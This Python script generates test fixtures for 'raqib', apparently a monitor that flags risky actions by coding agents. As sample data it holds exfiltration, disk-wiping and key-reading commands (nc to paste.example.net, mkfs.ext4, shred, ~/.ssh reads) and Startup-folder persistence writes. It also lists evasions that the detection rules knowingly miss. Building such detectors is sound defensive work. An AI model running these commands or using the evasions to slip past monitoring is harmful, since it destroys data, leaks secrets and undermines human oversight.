"""Generate tests/fixtures/rules/** in the shape raqib/hooks/capture.py writes.

Run from the repository root: python3 tests/fixtures/rules/generate.py
"""
import datetime, hashlib, importlib.util, json, os, sys
# M4.2: Bash lines with command_programs are made by capture itself, from the command.
_spec = importlib.util.spec_from_file_location("raqib_capture_for_fixtures", os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "raqib", "hooks", "capture.py"))
CAPTURE = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(CAPTURE)
T0 = datetime.datetime(2026, 10, 16, 13, 0, 0, tzinfo=datetime.timezone.utc)
CWD = "/work/example"
R = "tests/fixtures/rules/"
KEYS = ["ts", "seq", "session_id", "phase", "tool", "tool_use_id", "input_sha256", "input_meta",
        "output_sha256", "output_meta", "ok", "error_class", "cwd", "source"]

def ts(sec):
    return (T0 + datetime.timedelta(seconds=sec)).isoformat(timespec="milliseconds").replace("+00:00", "Z")

def h(*x):
    return hashlib.sha256(json.dumps(x, sort_keys=True).encode()).hexdigest()

class S:
    def __init__(self, sid, cwd=CWD):
        self.sid, self.seq, self.t, self.lines, self.cwd = sid, 0, 0, [], cwd
    def event(self, phase):
        self.seq += 1; self.t += 1
        self.lines.append({"ts": ts(self.t), "seq": self.seq, "session_id": self.sid, "phase": phase,
                           "tool": "-", "cwd": self.cwd})
        return self.seq
    def call(self, tool, meta, ok=True, kinds=(), error_class=None, post=True):
        self.seq += 1
        base = {"seq": self.seq, "session_id": self.sid, "tool": tool,
                "tool_use_id": "toolu_%s_%d" % (self.sid[-8:], self.seq),
                "input_sha256": h(self.sid, self.seq, tool, meta), "input_meta": meta}
        self.t += 1
        self.lines.append(dict(base, ts=ts(self.t), phase="pre", cwd=self.cwd))
        if post:
            self.t += 2
            rec = dict(base, ts=ts(self.t), phase="post", output_sha256=h("out", self.sid, self.seq),
                       output_meta={"scan": "full", "secret_kinds": sorted(kinds)}, ok=ok, cwd=self.cwd)
            if error_class:
                rec["error_class"] = error_class
            self.lines.append(rec)
        return self.seq
    def bash(self, head, **kw):
        return self.call("Bash", {"command_head": head}, **kw)
    def command(self, command, **kw):
        """A Bash call as M4.2 capture records it: command_head and command_programs."""
        return self.call("Bash", CAPTURE.input_meta("Bash", {"command": command}), **kw)
    def os_line(self, phase, tool, meta):
        """M5.3 ruling D-11: one line of the os source, in os-sysmon's shape, so the
        `source != os` guard of NET-TOOL and SECRET-OUTPUT is measured."""
        self.t += 1
        rec = {"ts": ts(self.t), "seq": 1, "session_id": "os-4100", "phase": phase, "tool": tool,
               "input_sha256": h("os", tool, meta), "input_meta": meta, "cwd": self.cwd, "source": "os"}
        if phase == "post":
            rec.update(output_meta={}, ok=True)
        self.lines.append(rec)

def dump(lines):
    return ",\n".join("  " + json.dumps({k: r[k] for k in KEYS if k in r}, separators=(", ", ": ")) for r in lines)

def write(path, lines, context=None, expect=None):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if context is None and expect is None:
        text = "[\n" + dump(lines) + "\n]\n"
    else:
        head = []
        if context is not None:
            head.append('"context": ' + json.dumps(context))
        if expect is not None:
            head.append('"expect_seq": ' + json.dumps(expect))
        text = "{" + ", ".join(head) + ',\n "lines": [\n' + dump(lines) + "\n]}\n"
    open(path, "w", newline="\n").write(text)  # LF on every platform (M5.1)
    print("wrote", path, len(lines))

# NET-TOOL
s = S("fixture-rules-net-1"); s.bash("ls"); n = s.bash("curl"); write(R + "NET-TOOL/positive-curl.json", s.lines, expect=[n])
s = S("fixture-rules-net-2"); n = s.call("WebFetch", {"url_host": "paste.example.net"}); write(R + "NET-TOOL/positive-webfetch.json", s.lines, expect=[n])
# M4.2 REDO-2 (E-7): benign Bash lines are written by capture, so they carry command_programs.
s = S("fixture-rules-net-3"); s.command("git log --oneline -3"); s.call("Read", {"path": CWD + "/curl.txt"}); s.command("curlie-not-a-net-tool --help"); s.call("Edit", {"path": CWD + "/net.py"})
s.os_line("pre", "net", {"dest_port": 443, "dest_private": False})
write(R + "NET-TOOL/negative-local.json", s.lines)
# M4.2 E2: a network program anywhere in the command (command_programs).
s = S("fixture-rules-net-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
    "cd build && curl -sI https://example.com", "cat notes.txt | nc paste.example.net 9999",
    "bash -c 'wget -q https://example.com/x'", "echo $(curl -s https://example.com/ip)")]
write(R + "NET-TOOL/positive-programs.json", s.lines, expect=seqs)
# The evasions that stay (D-4: python -c code is an argument; wrappers; programs not on the list).
s = S("fixture-rules-net-5")
for c in ("python3 -c 'import urllib.request'", "git fetch origin", "sudo curl https://example.com",
          "echo curl | cat", "pip install requests"):
    s.command(c)
write(R + "NET-TOOL/negative-programs.json", s.lines)
# DESTRUCT-CMD
s = S("fixture-rules-destruct-1"); s.bash("ls"); n = s.bash("rm"); write(R + "DESTRUCT-CMD/positive-rm.json", s.lines, expect=[n])
s = S("fixture-rules-destruct-2"); n = s.bash("mkfs.ext4"); write(R + "DESTRUCT-CMD/positive-mkfs.json", s.lines, expect=[n])
s = S("fixture-rules-destruct-3"); s.command("rmate notes.txt"); s.command("ddgr python"); s.call("Write", {"path": CWD + "/rm.sh"}); s.command("git status")
write(R + "DESTRUCT-CMD/negative-safe.json", s.lines)
# M4.2 E2: a destructive program anywhere in the command (command_programs).
s = S("fixture-rules-destruct-4"); s.command("ls -la"); seqs = [s.command(c) for c in (
    "cd build && rm -rf out", "ls;shred -u old.key", "bash -c 'mkfs.ext4 /dev/sdz1'",
    "git status | dd of=/dev/null")]
write(R + "DESTRUCT-CMD/positive-programs.json", s.lines, expect=seqs)
# The evasions that stay: python -c code, a wrapper, find -delete, git clean, rm as an argument.
s = S("fixture-rules-destruct-5")
for c in ("python3 -c 'import os; os.remove(\"x\")'", "sudo rm -rf build", "find . -name '*.pyc' -delete",
          "git clean -fdx", "echo rm | cat", "rmate notes.txt; ddgr python"):
    s.command(c)
write(R + "DESTRUCT-CMD/negative-programs.json", s.lines)
# SCOPE-PATH
s = S("fixture-rules-scope-1"); n = s.call("Read", {"path": "~/.ssh/id_ed25519"}); write(R + "SCOPE-PATH/positive-ssh-key.json", s.lines, expect=[n])
s = S("fixture-rules-scope-2"); a = s.call("Edit", {"path": "/etc/hosts"}); b = s.call("Write", {"path": "../other-project/notes.md"})
write(R + "SCOPE-PATH/positive-etc-and-dotdot.json", s.lines, expect=[a, b])
s = S("fixture-rules-scope-3"); n = s.call("Read", {"path": "/work/example-secrets/token.txt"}); write(R + "SCOPE-PATH/positive-sibling-prefix.json", s.lines, expect=[n])
s = S("fixture-rules-scope-4"); s.call("Read", {"path": CWD + "/src/app.py"}); s.call("Edit", {"path": "src/app.py"})
s.call("Glob", {"path": CWD}); s.call("Grep", {}); s.call("Read", {"path": CWD + "/src/../README.md"}); s.bash("cat")
write(R + "SCOPE-PATH/negative-inside.json", s.lines)
# SECRET-OUTPUT
s = S("fixture-rules-secret-1"); n = s.bash("cat", kinds=["aws_access_key_id"]); write(R + "SECRET-OUTPUT/positive-aws-key-in-cat.json", s.lines, expect=[n])
s = S("fixture-rules-secret-2"); n = s.bash("curl", ok=False, kinds=["github_token", "jwt"], error_class="failure")
write(R + "SECRET-OUTPUT/positive-failure-message.json", s.lines, expect=[n])
s = S("fixture-rules-secret-3"); s.bash("cat"); s.call("Read", {"path": CWD + "/.env.example"})
s.os_line("post", "process", {"command_head": "cat.exe", "command_programs": ["cat.exe"], "depth": 2})
write(R + "SECRET-OUTPUT/negative-clean-output.json", s.lines)
# DRIFT-FILES
scope = {"scope": ["src", "tests/test_app.py", "docs/review"]}
s = S("fixture-rules-drift-1"); seqs = []
for p in ["src/a.py", "README.md", "setup.cfg", "src/b.py", "tools/gate.sh", "./README.md"]:
    seqs.append(s.call("Edit", {"path": p if p.startswith("./") else CWD + "/" + p}))
write(R + "DRIFT-FILES/positive-three-files.json", s.lines, scope, expect=[seqs[1], seqs[2], seqs[4], seqs[5]])
s = S("fixture-rules-drift-2")
for p in ["src/a.py", "src/pkg/b.py", "tests/test_app.py", "docs/review/q.md", "src/a.py"]:
    s.call("Write" if p.endswith(".md") else "Edit", {"path": CWD + "/" + p})
s.call("Read", {"path": CWD + "/README.md"}); s.call("Read", {"path": CWD + "/setup.cfg"}); s.call("Read", {"path": CWD + "/tools/gate.sh"})
write(R + "DRIFT-FILES/negative-in-scope.json", s.lines, scope)
s = S("fixture-rules-drift-3")
for p in ["README.md", "setup.cfg", "/work/example/x/../README.md", "src/a.py"]:
    s.call("Edit", {"path": p if p.startswith("/") else CWD + "/" + p})
s.call("Edit", {"path": CWD + "/tools/gate.sh"}, ok=False)
s.call("Edit", {"path": CWD + "/Makefile"}, post=False)
write(R + "DRIFT-FILES/negative-two-files.json", s.lines, scope)
# SCOPE-CWD-ROOT
a = S("fixture-rules-cwdroot-1", cwd="/"); first_a = a.event("session_start"); a.bash("ls")
b = S("fixture-rules-cwdroot-2", cwd="/home/alice"); first_b = b.call("Read", {"path": "/home/alice/notes.txt"})
more = []
for i, cwd in enumerate(["/root", "/Users/bob", "/tmp", "/home/carol/.", "/mnt/c/Users/dan", "/var/root"], start=5):
    m = S("fixture-rules-cwdroot-%d" % i, cwd=cwd); m.event("session_start"); m.bash("ls"); more += m.lines
# Every other alternative of the rule's regex, so none can be dropped unseen (M-REV).
for i, cwd in enumerate(["/home", "/USERS", "/mnt", "/media", "/srv", "/opt", "/var/tmp", "/mnt/d"], start=13):
    m = S("fixture-rules-cwdroot-%d" % i, cwd=cwd); m.event("session_start"); m.bash("ls"); more += m.lines
write(R + "SCOPE-CWD-ROOT/positive-root-and-home.json", a.lines + b.lines + more)
a = S("fixture-rules-cwdroot-3", cwd="/home/alice/project"); a.event("session_start"); a.bash("ls")
b = S("fixture-rules-cwdroot-4"); b.call("Read", {"path": CWD + "/a.py"})
c = S("fixture-rules-cwdroot-11", cwd="/tmp/build-123"); c.event("session_start"); c.bash("make")
d = S("fixture-rules-cwdroot-12", cwd="/opt/app"); d.event("session_start"); d.bash("ls")
write(R + "SCOPE-CWD-ROOT/negative-project-dir.json", a.lines + b.lines + c.lines + d.lines)
# SCOPE-CWD-MOVED
s = S("fixture-rules-cwdmoved-1"); first = s.event("session_start"); s.bash("ls"); s.cwd = "/tmp"; moved = s.bash("cat"); s.cwd = "/tmp/"; s.bash("ls")
write(R + "SCOPE-CWD-MOVED/positive-cd-out.json", s.lines, expect=[first, moved])
s = S("fixture-rules-cwdmoved-2"); s.event("session_start"); s.bash("ls"); s.call("Read", {"path": CWD + "/a.py"}); s.event("stop")
write(R + "SCOPE-CWD-MOVED/negative-steady.json", s.lines)
# M5.1b: Windows paths (rulings 2026-11-02 Q-4..Q-6, 2026-11-03 C-1, C-2, C-9). W is a
# Windows cwd; C:\proj, c:/PROJ, C:\proj\ and \\?\C:\proj are one directory.
W = "C:\\proj"
UNC = "\\\\srv\\share\\proj"
# SCOPE-PATH
s = S("fixture-rules-scope-win-1", cwd=W)
seqs = [s.call(tool, {"path": p}) for tool, p in [
    ("Read", "C:\\Users\\alice\\.ssh\\id_rsa"), ("Edit", "D:\\proj\\notes.md"), ("Write", "..\\other-project\\notes.md"),
    ("Read", "\\\\srv\\share\\secrets.txt"), ("Read", "C:\\proj-secrets\\token.txt"), ("Read", "/etc/hosts"),
    ("Grep", "c:/PROJ/../other"), ("Read", "\\\\.\\pipe\\secrets"),  # C-9: \\.\pipe keeps its prefix
    ("Read", "~\\.ssh\\id_rsa")]]  # C-13: a ~ path is POSIX, outside a Windows cwd
k = S("fixture-rules-scope-win-5", cwd="C:\\work")  # C-11: KELVIN SIGN is not folded to k
k.call("Read", {"path": "C:\\WOR\u212a\\secrets.txt"})  # its seq 1 is cited per session in tests/test_rules.py
write(R + "SCOPE-PATH/positive-windows.json", s.lines + k.lines, expect=seqs)
s = S("fixture-rules-scope-win-2", cwd=W); n = s.call("Read", {"path": "/c/proj/src/app.py"})  # C-2: Git Bash form, a known FP
write(R + "SCOPE-PATH/positive-windows-git-bash-form.json", s.lines, expect=[n])
s = S("fixture-rules-scope-win-3", cwd=W)
for tool, p in [("Read", "C:\\proj\\src\\app.py"), ("Edit", "src\\app.py"), ("Read", "c:/PROJ/README.md"),
                ("Glob", "C:\\proj"), ("Read", "C:\\proj\\src\\..\\README.md"), ("Write", "C:/Proj/docs/notes.md"),
                ("Read", "\\\\?\\C:\\proj\\src\\app.py")]:  # C-9
    s.call(tool, {"path": p})
u = S("fixture-rules-scope-win-4", cwd=UNC); u.call("Read", {"path": "\\\\SRV\\Share\\proj\\a.py"}); u.call("Edit", {"path": "b.py"})
u.call("Read", {"path": "\\\\?\\UNC\\srv\\share\\proj\\c.py"})  # C-9
write(R + "SCOPE-PATH/negative-windows.json", s.lines + u.lines)
# SCOPE-CWD-MOVED
s = S("fixture-rules-cwdmoved-win-1", cwd=W); first = s.event("session_start"); s.bash("dir"); s.cwd = "D:\\proj"; moved = s.bash("dir")
t = S("fixture-rules-cwdmoved-win-2", cwd="/mnt/c/proj"); t.event("session_start"); t.cwd = W; t.bash("dir")  # Q-6: two cwds
write(R + "SCOPE-CWD-MOVED/positive-windows.json", s.lines + t.lines, expect=[first, moved])
s = S("fixture-rules-cwdmoved-win-3", cwd=W); s.event("session_start"); s.bash("dir"); s.cwd = "c:/PROJ"
s.call("Read", {"path": "src\\a.py"}); s.cwd = "\\\\?\\C:\\proj"; s.bash("dir")  # C-9
s.cwd = "C:\\proj\\"; s.event("stop")
u = S("fixture-rules-cwdmoved-win-4", cwd=UNC); u.event("session_start"); u.cwd = "\\\\SRV\\Share\\proj\\."; u.bash("dir")
write(R + "SCOPE-CWD-MOVED/negative-windows.json", s.lines + u.lines)
# SCOPE-CWD-ROOT: every alternative of the Windows branch (C-1), so none can be dropped unseen.
more = []
for i, cwd in enumerate(["C:\\", "c:/", "D:\\.", "C:\\Users", "C:\\Users\\alice", "c:/users/bob/", "C:\\Windows",
                         "C:\\WINDOWS\\Temp", "E:\\Temp\\", "C:\\Program Files", "C:\\Program Files (x86)",
                         "C:\\ProgramData", "C:\\Users\\alice\\AppData\\Local\\Temp", "\\\\srv\\share",
                         "\\\\SRV\\Share\\.", "\\\\?\\C:\\Users\\alice", "\\\\?\\UNC\\srv\\share"], start=1):  # C-9
    m = S("fixture-rules-cwdroot-win-%d" % i, cwd=cwd); m.event("session_start"); m.bash("dir"); more += m.lines
write(R + "SCOPE-CWD-ROOT/positive-windows-roots.json", more)
more = []
for i, cwd in enumerate(["C:\\proj", "C:\\Users\\alice\\proj", "C:\\Windows\\System32", "C:\\Temp\\build-123",
                         "C:\\Program Files\\App", "C:\\ProgramData\\App", "C:\\Users\\alice\\AppData\\Local\\Temp\\build",
                         UNC, "\\\\?\\C:\\proj"], start=18):
    m = S("fixture-rules-cwdroot-win-%d" % i, cwd=cwd); m.event("session_start"); m.bash("dir"); more += m.lines
write(R + "SCOPE-CWD-ROOT/negative-windows-project-dirs.json", more)
# DRIFT-FILES: a Windows context root (E2), entries with \ or /, paths in any case.
s = S("fixture-rules-drift-win-1", cwd=W); seqs = []
for p in ["C:\\proj\\src\\a.py", "C:\\proj\\README.md", "setup.cfg", "C:\\PROJ\\SRC\\b.py", "tools\\gate.sh",
          "c:/proj/./README.md", "C:\\proj\\tests\\test_app.py"]:
    seqs.append(s.call("Edit", {"path": p}))
write(R + "DRIFT-FILES/positive-windows.json", s.lines, {"scope": ["src", "tests\\test_app.py", "docs/review"], "root": W},
      expect=[seqs[1], seqs[2], seqs[4], seqs[5]])
s = S("fixture-rules-drift-win-2", cwd=W)
for p in ["C:\\proj\\src\\a.py", "src\\pkg\\b.py", "C:/Proj/Tests/Test_App.py", "c:\\proj\\docs\\review\\q.md",
          "C:\\proj\\README.md", "setup.cfg", "\\\\?\\C:\\proj\\src\\c.py"]:  # C-9: inside src
    s.call("Edit", {"path": p})
s.call("Edit", {"path": "C:\\proj\\tools\\gate.sh"}, ok=False); s.call("Read", {"path": "C:\\proj\\Makefile"})
write(R + "DRIFT-FILES/negative-windows.json", s.lines, {"scope": ["src", "tests\\test_app.py", "docs/review"], "root": "c:/PROJ/"})
# M4.2b (ADR-0002 Amendments D, G): the two demands. Bash lines are written by capture,
# so they carry command_programs, command_scripts and commit_prefix as capture reads them.
HEREDOC = "git commit -m \"$(cat <<'EOF'\nlanded: M9.9 fixture\n\nbody line\nEOF\n)\""
# LANDED-NO-GATE: positives, one landing per session with no ok gate run on it or before it.
fire = []
a = S("fixture-rules-landed-1"); a.event("session_start"); a.call("Edit", {"path": CWD + "/raqib/x.py"})
fire.append(a.command("git add -A && git commit -m 'landed: M9.9 x'"))
b = S("fixture-rules-landed-2"); b.event("session_start"); b.command("tools/gate.sh", ok=False, error_class="failure")
fire.append(b.command(HEREDOC))                                              # a RED gate is no evidence
c = S("fixture-rules-landed-3"); c.event("session_start"); c.command("python3 -c 'pass' gate.py")   # G-2: no script
fire.append(c.command("git -C /work/example commit -am 'landed: M9.9 y'"))
d = S("fixture-rules-landed-4"); d.event("session_start"); d.command("tools/gate.sh"); d.event("stop")
e = S("fixture-rules-landed-5"); e.event("session_start")                     # the gate ran in another session
fire.append(e.command("git commit -m 'landed: M9.9 z'"))
write(R + "LANDED-NO-GATE/positive-landings.json", a.lines + b.lines + c.lines + d.lines + e.lines, expect=sorted(set(fire)))
# LANDED-NO-GATE: negatives, a gated landing in every form, the accepted holes, and commits that are not landings.
a = S("fixture-rules-landed-6"); a.event("session_start"); a.command("tools/gate.sh && git commit -m 'landed: M9.9 x'")
b = S("fixture-rules-landed-7"); b.event("session_start"); b.command("tools/gate.sh")
b.call("Edit", {"path": CWD + "/raqib/y.py"}); b.command(HEREDOC)            # a stale gate: accepted in v1 (G-5)
c = S("fixture-rules-landed-8"); c.event("session_start"); c.command("python -I tools/gate.py"); c.command(HEREDOC)
d = S("fixture-rules-landed-9"); d.event("session_start"); d.command("bash tools/gate.sh 2>&1 | tail -5")
d.command("git commit -m 'landed: M9.9 piped'")                              # a piped gate: the G-5 hole
e = S("fixture-rules-landed-10"); e.event("session_start"); e.bash("gate.sh")   # a line before M4.2 (G-8)
e.command("git commit -m 'landed: M9.9 old'")
f = S("fixture-rules-landed-11"); f.event("session_start"); f.command("git commit -m 'wip: M9.9'")
f.command("git commit -m 'landed: M9.9 failed'", ok=False, error_class="failure"); f.command("git commit -m 'STOP: M9.9 q'")
f.command("git commit --amend -m 'landed: M9.9 amend'"); f.command("git merge -m 'landed: M9.9 merge' x")
f.event("stop")
write(R + "LANDED-NO-GATE/negative-gated.json", a.lines + b.lines + c.lines + d.lines + e.lines + f.lines)
# LANDED-NO-GATE: the Windows forms (ruling H-1), cwd C:\proj: the README's python -I tools\gate.py,
# py -I tools\gate.py, timeout 900 tools/gate.sh, all before a landing: clean.
a = S("fixture-rules-landed-win-1", cwd=W); a.event("session_start"); a.command("python -I tools\\gate.py"); a.command(HEREDOC)
b = S("fixture-rules-landed-win-2", cwd=W); b.event("session_start"); b.command("timeout 900 tools/gate.sh")
b.command("git commit -m 'landed: M9.9 timeout'")
c = S("fixture-rules-landed-win-3", cwd=W); c.event("session_start"); c.command("py -I tools\\gate.py"); c.command(HEREDOC)
d = S("fixture-rules-landed-win-4", cwd=W); d.event("session_start")
d.command("python.exe -I tools\\gate.py && git commit -m 'landed: M9.9 same line'"); d.event("stop")
write(R + "LANDED-NO-GATE/negative-windows.json", a.lines + b.lines + c.lines + d.lines)
# EDIT-NO-TEST: positives, untested edits under raqib/ or tests/ at every stop or session_end.
fire = []
a = S("fixture-rules-edit-1"); a.event("session_start"); fire.append(a.call("Edit", {"path": CWD + "/raqib/rules/engine.py"}))
fire.append(a.call("Write", {"path": CWD + "/tests/test_x.py"})); fire.append(a.event("stop"))
b = S("fixture-rules-edit-2"); b.event("session_start"); b.call("Edit", {"path": CWD + "/tests/a.py"}); b.command("pytest -q")
fire.append(b.call("Edit", {"path": CWD + "/raqib/b.py"})); fire.append(b.event("stop"))      # edited again after the run
c = S("fixture-rules-edit-3"); c.event("session_start"); fire.append(c.call("Edit", {"path": "raqib/a.py"}))
fire.append(c.event("stop")); c.command("pytest -q"); c.event("stop")       # tested only in the next turn
d = S("fixture-rules-edit-4"); d.event("session_start"); fire.append(d.call("MultiEdit", {"path": CWD + "/raqib/a.py"}))
fire.append(d.call("NotebookEdit", {"path": CWD + "/tests/n.ipynb"})); fire.append(d.event("session_end"))
e = S("fixture-rules-edit-5"); e.event("session_start"); fire.append(e.call("Edit", {"path": CWD + "/tests/a.py"}))
e.command("pytest -q", ok=False, error_class="failure"); e.command("make test"); fire.append(e.event("stop"))
write(R + "EDIT-NO-TEST/positive-untested.json", a.lines + b.lines + c.lines + d.lines + e.lines, expect=sorted(set(fire)))
# EDIT-NO-TEST: negatives, a test run after every edit, and lines that are not triggers.
a = S("fixture-rules-edit-6"); a.event("session_start"); a.call("Edit", {"path": CWD + "/raqib/a.py"}); a.command("pytest -q")
a.event("stop")
b = S("fixture-rules-edit-7"); b.event("session_start"); b.call("Edit", {"path": CWD + "/tests/a.py"})
b.command("bash tools/gate.sh"); b.event("stop")
c = S("fixture-rules-edit-8"); c.event("session_start"); c.call("Write", {"path": CWD + "/raqib/x.py"})
c.command("cd /work/example && python -I tools/gate.py"); c.event("stop"); c.event("session_end")
d = S("fixture-rules-edit-9"); d.event("session_start"); d.call("Edit", {"path": CWD + "/src/a.py"})
d.call("Edit", {"path": CWD + "/raqib-notes/a.md"}); d.call("Read", {"path": CWD + "/tests/a.py"})
d.call("Edit", {"path": CWD + "/tests/b.py"}, ok=False, error_class="failure"); d.event("stop")
e = S("fixture-rules-edit-10"); e.event("session_start"); e.call("Edit", {"path": CWD + "/tests/a.py"})
e.bash("pytest"); e.event("stop")                                            # a line before M4.2 (G-8)
f = S("fixture-rules-edit-11"); f.event("session_start"); f.call("Edit", {"path": CWD + "/raqib/a.py"})
f.command("tools/gate.sh 2>&1 | tail -3"); f.event("stop")                   # a piped gate: the G-5 hole
write(R + "EDIT-NO-TEST/negative-tested.json", a.lines + b.lines + c.lines + d.lines + e.lines + f.lines)
# benign corpus: realistic sessions; some are expected to trip rules (A6 budgets)
s = S("fixture-benign-dev"); s.event("session_start")
for tool, meta in [("Glob", {"path": CWD}), ("Read", {"path": CWD + "/src/app.py"}), ("Grep", {"path": CWD + "/src"}),
                   ("Edit", {"path": CWD + "/src/app.py"}), ("Write", {"path": CWD + "/tests/test_app.py"})]:
    s.call(tool, meta)
for command in ("python3 -m pip list", "git status", "git diff --stat", "ls -la", "pytest -q"):
    s.command(command)
s.event("stop")
write(R + "benign/dev-session.json", s.lines)
s = S("fixture-benign-docs"); s.event("session_start"); s.call("Read", {"path": CWD + "/pyproject.toml"})
s.call("WebFetch", {"url_host": "docs.python.org"}); s.call("Edit", {"path": CWD + "/pyproject.toml"}); s.event("stop")
write(R + "benign/docs-lookup.json", s.lines)
s = S("fixture-benign-cleanup"); s.event("session_start"); s.command("make"); s.command("rm -rf build"); s.command("make test"); s.event("stop")
write(R + "benign/build-cleanup.json", s.lines)
s = S("fixture-benign-scoped"); s.event("session_start")
for p in ["src/app.py", "tests/test_app.py", "src/util.py"]:
    s.call("Read", {"path": CWD + "/" + p}); s.call("Edit", {"path": CWD + "/" + p})
s.command("pytest -q tests"); s.command("git diff --stat"); s.event("stop")
write(R + "benign/scoped-task-session.json", s.lines, {"scope": ["src", "tests"]})

# M7.2: NEW-AGENT and AGENT-DARK-LIVE judge host lines (raqib watch --host), not hook lines; their
# fixtures are made from the discover fixtures by tests/fixtures/host/make.py, through raqib/host.py.
_spec = importlib.util.spec_from_file_location("raqib_host_fixtures", os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "host", "make.py"))
HOST = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(HOST)
for _name, _text in HOST.build().items():
    os.makedirs(os.path.dirname(R + _name), exist_ok=True)
    open(R + _name, "w", newline="\n").write(_text)
    print("wrote", R + _name)

# M7.8 (ADR-0007 Amendment P, P-1): NET-TOOL and DESTRUCT-CMD judge os process lines by input_meta.image; their
# os-line fixtures are os-sysmon's lines of the SYNTHETIC exports, made by tests/fixtures/os/synthetic.py.
_spec = importlib.util.spec_from_file_location("raqib_os_fixtures", os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "os", "synthetic.py"))
OS = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(OS)
_exports = OS.os_fixture_exports()
for _name, (_names, _cite) in OS.OS_RULE_FIXTURES.items():
    os.makedirs(os.path.dirname(R + _name), exist_ok=True)
    open(R + _name, "w", newline="\n").write(OS.os_rule_fixture(_names, _cite, _exports))
    print("wrote", R + _name)

# M15.1 (ADR-0014 A-3, A-4): PERSIST-AUTOSTART and NET-ADMIN-PORT, the first rules of behaviour. Their os lines are
# os-sysmon's own (os_sysmon.build) of SYNTHETIC exports made here with synthetic.py's Export (user `user`, private
# example or documentation addresses); their hooks lines are written as capture writes a file tool's.
from raqib.hooks import os_sysmon as _OS_SYSMON  # noqa: E402  (the checkout is on sys.path since host/make.py's load above)
STARTUP = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
ALL_STARTUP = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"   # all users'; Windows' own case
PWSH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
OS_SSH = "C:\\Windows\\System32\\OpenSSH\\ssh.exe"
CMD_EXE = "C:\\Windows\\System32\\cmd.exe"

def os_export(first, root, acts):
    """A SYNTHETIC export: the agent (root) under explorer, then acts, each ("proc", at, pid, image, ppid, pimage),
    ("file", at, pid, image, path), ("net", at, pid, image, ip, port[, initiated]) (initiated "-" drops the field) or
    (M15.2) ("reg", at, pid, image, target, details): a Sysmon event 13 (SetValue) as measured (ADR-0014 AB)."""
    x = OS.Export(first_record=first)
    x.proc("00.100", root, OS.AGENT, '"%s"' % OS.AGENT, 900, OS.EXPLORER, "C:\\Windows\\Explorer.EXE")
    for act in acts:
        if act[0] == "reg":
            _, at, pid, image, target, details = act
            x.event(13, at, [("RuleName", "-"), ("EventType", "SetValue"), ("UtcTime", OS.DAY + at),
                             ("ProcessGuid", OS.pguid_of(pid)), ("ProcessId", pid), ("Image", image),
                             ("TargetObject", target), ("Details", details), ("User", "host\\user")])
        elif act[0] == "proc":
            _, at, pid, image, ppid, pimage = act
            x.proc(at, pid, image, '"%s"' % image, ppid, pimage, '"%s"' % pimage)
        elif act[0] == "file":
            x.file(*act[1:])
        else:
            _, at, pid, image, ip, port = act[:6]
            x.net(at, pid, image, ip, port, sport=50001)
            said = act[6] if len(act) > 6 else "true"
            line = x.lines[-1].replace("<Data Name='Initiated'>true</Data>",
                                       "" if said == "-" else "<Data Name='Initiated'>%s</Data>" % said)
            x.lines[-1] = line.replace("<Data Name='DestinationIsIpv6'>false</Data>",
                                       "<Data Name='DestinationIsIpv6'>%s</Data>" % ("true" if ":" in ip else "false"))
    return x.text()

def os_doc(path, export, root, cite=None, strip=(), edit=None):
    """os-sysmon's lines of the export's tree (keys in strip taken out of every net line: a line written before them;
    edit, M15.2: a function given each line, to make a line os-sysmon does not write); a positive's expect_seq is the
    seq of every pre line of the tool cite names whose path or port is cited."""
    got, _ = _OS_SYSMON.build(export, root, cwd=OS.OS_CWD)
    lines = [json.loads(line) for line in got]
    for r in lines:
        if r["tool"] == "net":
            for key in strip:
                r["input_meta"].pop(key)
        if edit is not None:
            edit(r)
    doc = {"lines": lines}
    if cite:
        doc["expect_seq"] = sorted(r["seq"] for r in lines if r["phase"] == "pre" and cite(r))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, "w", newline="\n").write(json.dumps(doc, indent=1, sort_keys=True, ensure_ascii=True) + "\n")
    print("wrote", path, len(lines))

# PERSIST-AUTOSTART: a file directly in a user's and in all users' Startup folder (os), a hooks Write in both slashes.
os_doc(R + "PERSIST-AUTOSTART/positive-os-file.json", os_export(75001, 4900, [
    ("proc", "02.000", 4910, CMD_EXE, 4900, OS.AGENT), ("proc", "02.100", 4920, PWSH, 4910, CMD_EXE),
    ("file", "02.500", 4920, PWSH, STARTUP + "raqib-rig-test.cmd"),
    ("file", "03.000", 4900, OS.AGENT, ALL_STARTUP + "agent-helper.lnk")]), 4900,
    cite=lambda r: r["tool"] == "file" and "\\Startup\\" in r["input_meta"]["path"].replace("StartUp", "Startup"))
s = S("fixture-rules-persist-1", cwd=W); seqs = [s.call("Write", {"path": STARTUP + "run.cmd"}),
                                             s.call("Write", {"path": STARTUP.replace("\\", "/") + "run.bat"})]
write(R + "PERSIST-AUTOSTART/positive-hooks-write.json", s.lines, expect=seqs)
# Not a Startup file: desktop.ini (Windows' own), a deeper folder, another folder of the Start Menu, a file under TEMP
# (ADR-0014 A-6: an agent's ordinary work, recorded and judged by no rule).
os_doc(R + "PERSIST-AUTOSTART/negative-os-file.json", os_export(75101, 4901, [
    ("proc", "02.000", 4911, CMD_EXE, 4901, OS.AGENT), ("proc", "02.100", 4921, PWSH, 4911, CMD_EXE),
    ("file", "02.500", 4921, PWSH, "C:\\Users\\user\\AppData\\Local\\Temp\\raqib-effect-1.txt"),
    ("file", "03.000", 4901, OS.AGENT, STARTUP + "desktop.ini"),
    ("file", "03.500", 4901, OS.AGENT, STARTUP + "old\\run.cmd"),
    ("file", "04.000", 4901, OS.AGENT, STARTUP.replace("Startup\\", "Accessories\\") + "notes.lnk")]), 4901)
s = S("fixture-rules-persist-2", cwd=W); s.call("Read", {"path": STARTUP + "run.cmd"})
s.call("Glob", {"path": STARTUP}); s.call("Write", {"path": STARTUP.replace("\\", "/") + "DESKTOP.INI"})
